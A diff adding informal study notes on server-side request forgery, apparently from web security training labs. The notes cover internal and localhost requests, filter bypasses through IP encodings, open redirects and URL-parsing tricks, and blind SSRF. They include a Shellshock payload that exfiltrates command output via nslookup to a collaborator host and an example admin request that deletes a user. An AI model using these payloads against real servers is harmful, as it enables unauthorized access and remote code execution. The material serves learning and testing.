@@ -1,1 +1,91 @@
+Server-side request forgery is a web security vulnerability that allows an attacker to cause the server-side application to make requests to an unintended location. 
 
+1.basic SSRF against local server
+if there is any parameter or api that requests to a server e we can  request our lcoal server toaccess some of the restricted functionality that cannot be esuily accessible
+
+eg---> POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+
+
+then we can use
+
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://localhost/admin
+to access restricted functioanlity
+
+
+
+
+2.SSRF attacks against other back-end systems
+sometimes we need to scan the internal network ----> using burp intruder 
+to find a private ip that could be hosting some functionality
+
+eg--->POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://192.168.0.68/admin
+
+
+
+3.Circumventing common SSRF defenses
+i.SSRF with blacklist-based input filters
+sometimes eerver may block ip or specific strings like ---> 127.0.0.1 or localhost or admin
+
+then we can do---->
+use---> Use an alternative IP representation of 127.0.0.1, such as 2130706433, 017700000001, or 127.1   -   --------------------------
+ Obfuscate blocked strings using URL encoding or case variation.                                                                     |   ------> important
+switching from an http: to https: URL during the redirect has been shown to bypass some anti-SSRF filters. ---------------------------
+
+
+
+
+4.Bypassing SSRF filters via open redirection
+sometimes bowser may send request that could contan request ro another server in this case we may intercpt ad use to manipulate the addresst oa cees restricted functionality
+eg  
+
+/product/nextProduct?currentProductId=6&path=http://evil-user.net
+
+
+
+5.simple blind SSRF injection
+use burp collabrotaor to find any oast interaction to find blind injection
+useful    ------> You can blindly sweep the internal IP address space, sending payloads designed to detect well-known vulnerabilities.
+                  If those payloads also employ blind out-of-band techniques, then you might uncover a critical vulnerability on an unpatched internal server. 
+
+
+
+6.blind SSRF with shellsock exploitaion
+use collaborator everywhere to find the ssrf -----. any header found can be used to deliver paylaod to that ip
+one found we can use shellsock exploit to user-agent
+with following payload ---> () { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN
+that should give us oast interaction with code execution
+
+
+
+++++++++++++++++++++++++++++++++++++++++++MOST IMportant++++++++++++++++++++++++++++++
+7.SSRF with whitelist-based input filters
+allow only that are in whitelist else are not allowed
+
+You may be able to bypass this filter by exploiting inconsistencies in URL parsing. 
+
+eg ->
+1. url encoding sim=ngle and multiple times
+2.https://expected-host:fakepassword@evil-host         -----> evil host is localhost or any other we wasnt to access expected is something that werver was going to connect to
+3.https://evil-host#expected-host
+4.https://expected-host.evil-host
+
+we can use combination of these techniques for example
+                     _____> its # in url encode
+                    |
+http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
+
+X@V
+v#X
+X.v
